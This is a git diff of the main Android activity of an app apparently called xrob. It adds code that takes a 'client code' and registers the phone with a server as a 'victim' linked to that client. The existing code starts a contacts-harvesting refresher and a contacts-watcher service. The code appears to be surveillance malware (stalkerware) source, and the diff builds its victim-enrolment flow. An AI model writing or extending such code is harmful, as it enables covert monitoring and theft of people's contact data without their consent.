@@ -7,15 +7,38 @@ import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.view.View;
+import android.widget.EditText;
 import android.widget.Toast;
 
 import com.theah64.xrob.asynctasks.ContactRefresher;
+import com.theah64.xrob.interfaces.JobListener;
 import com.theah64.xrob.services.ContactsWatcherService;
+import com.theah64.xrob.utils.APIRequestBuilder;
+import com.theah64.xrob.utils.APIRequestGateway;
+import com.theah64.xrob.utils.APIResponse;
+import com.theah64.xrob.utils.DialogUtils;
+import com.theah64.xrob.utils.OkHttpUtils;
+import com.theah64.xrob.utils.ProgressManager;
+
+import org.json.JSONException;
+
+import java.io.IOException;
+
+import okhttp3.Call;
+import okhttp3.Callback;
+import okhttp3.Request;
+import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
 
     private static final String X = MainActivity.class.getSimpleName();
     private static final int RQ_CODE_RQ_PERMISSIONS = 1;
+    private static final String KEY_CLIENT_CODE = "client_code";
+    private ProgressManager progressManager;
+    private EditText etClientCode;
+    private DialogUtils dialogUtils;
+    private Call connectCall;
 
 
     @Override
@@ -37,6 +60,75 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
+    private void connectClientVictim() {
+
+        final String clientCode = etClientCode.getText().toString();
+
+        if (!clientCode.isEmpty() && clientCode.length() == 10) {
+
+            progressManager.showLoading(R.string.Identifying_victim);
+
+            new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
+
+                @Override
+                public void onReadyToRequest(String apiKey) {
+
+                    progressManager.showLoading(getString(R.string.Connecting_victim_to_s, clientCode));
+
+                    //Connecting
+                    final Request connectRequest = new APIRequestBuilder("/connect/client_to_victim", apiKey)
+                            .addParam(KEY_CLIENT_CODE, clientCode)
+                            .build();
+
+                    connectCall = OkHttpUtils.getInstance().getClient().newCall(connectRequest);
+                    connectCall.enqueue(new Callback() {
+                        @Override
+                        public void onFailure(final Call call, IOException e) {
+                            runOnUiThread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    if (!call.isCanceled()) {
+                                        progressManager.showMainView();
+                                        dialogUtils.showErrorDialog(R.string.network_error);
+                                    }
+                                }
+                            });
+                        }
+
+                        @Override
+                        public void onResponse(Call call, Response response) throws IOException {
+                            final String jsonResp = OkHttpUtils.logAndGetStringBody(response);
+                            runOnUiThread(new Runnable() {
+                                @Override
+                                public void run() {
+                                    progressManager.showMainView();
+                                    try {
+                                        final String message = new APIResponse(jsonResp).getMessage();
+                                        etClientCode.setText(null);
+                                        dialogUtils.showSimpleMessage(R.string.Connected, message);
+                                    } catch (JSONException | APIResponse.APIException e) {
+                                        e.printStackTrace();
+                                        dialogUtils.showErrorDialog(e.getMessage());
+                                    }
+                                }
+                            });
+                        }
+                    });
+                }
+
+                @Override
+                public void onFailed(String reason) {
+                    progressManager.showMainView();
+                    dialogUtils.showErrorDialog(reason);
+                }
+            });
+
+        } else {
+            dialogUtils.showErrorDialog(R.string.Invalid_client_code);
+        }
+
+    }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         if (requestCode == RQ_CODE_RQ_PERMISSIONS) {
@@ -49,7 +141,25 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    @Override
+    protected void onStop() {
+        OkHttpUtils.cancelCall(connectCall);
+        super.onStop();
+    }
+
     private void doNormalWork() {
+
+        this.dialogUtils = new DialogUtils(this);
+        this.progressManager = new ProgressManager(this, R.id.llConnectVictimClient);
+        this.etClientCode = (EditText) findViewById(R.id.etClientCode);
+
+        findViewById(R.id.bConnect).setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+                connectClientVictim();
+            }
+        });
+
         new ContactRefresher(this).execute();
         startService(new Intent(this, ContactsWatcherService.class));
     }
